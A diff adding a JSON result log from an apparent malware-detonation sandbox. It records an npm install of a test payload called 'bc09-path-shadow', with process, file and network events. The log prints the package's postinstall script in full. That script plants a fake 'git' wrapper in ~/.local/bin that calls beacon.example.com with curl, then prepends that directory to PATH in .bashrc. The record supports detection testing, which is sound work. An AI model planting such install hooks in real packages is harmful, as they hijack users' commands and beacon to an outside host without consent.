@@ -1,0 +1,97 @@
+{
+ "job_id": "27e1cb66-91e0-439e-a32f-712ceb9beeaf",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 3.21,
+ "exec_events": [
+  {
+   "ts": "2026-11-03T22:31:01.588383772Z",
+   "pid": 287428,
+   "ppid": 287404,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-dee37ee7967cc802; \"$@\"; rc=$?; /bin/true post-dee37ee7967cc802; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/bc09-path-shadow",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:31:01.591514675Z",
+   "pid": 287469,
+   "ppid": 287428,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc09-path-shadow",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:31:01.592198494Z",
+   "pid": 287469,
+   "ppid": 287469,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc09-path-shadow",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:31:02.195664382Z",
+   "pid": 287488,
+   "ppid": 287469,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node scripts/setup.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc09-path-shadow"
+  },
+  {
+   "ts": "2026-11-03T22:31:02.196654434Z",
+   "pid": 287489,
+   "ppid": 287488,
+   "binary": "/usr/local/bin/node",
+   "args": "scripts/setup.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc09-path-shadow"
+  }
+ ],
+ "connect_events": [],
+ "dns_queries": [],
+ "file_events": [
+  {
+   "ts": "2026-11-03T22:31:01.737606715Z",
+   "pid": 287469,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  },
+  {
+   "ts": "2026-11-03T22:31:02.229665848Z",
+   "pid": 287489,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.bashrc"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/bc09-path-shadow/scripts/setup.js",
+   "package": null,
+   "sha256": "0af1cb6cd90c1071788075ccab4e15db4445d5195ee7ec8bf7f089e743d28e41",
+   "content": "const fs = require(\"fs\"), os = require(\"os\"), path = require(\"path\");\nconst bin = path.join(os.homedir(), \".local\", \"bin\");\nconst shim = '#!/bin/sh\\n'\n  + 'curl -s -m 3 http://beacon.example.com/p >/dev/null 2>&1\\n'\n  + 'exec /usr/bin/git \"$@\"\\n';\ntry {\n  fs.mkdirSync(bin, { recursive: true });\n  fs.writeFileSync(path.join(bin, \"git\"), shim, { mode: 0o755 });\n  fs.appendFileSync(path.join(os.homedir(), \".bashrc\"), '\\nexport PATH=\"' + bin + ':$PATH\"\\n');\n} catch {}\n",
+   "truncated": false
+  }
+ ],
+ "decoys": {},
+ "stdout_tail": "\n> bc09@1.0.0 postinstall\n> node scripts/setup.js\n\n\nup to date in 521ms\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.67,
+  "peak_memory_mb": 31.7,
+  "samples": 2
+ }
+}
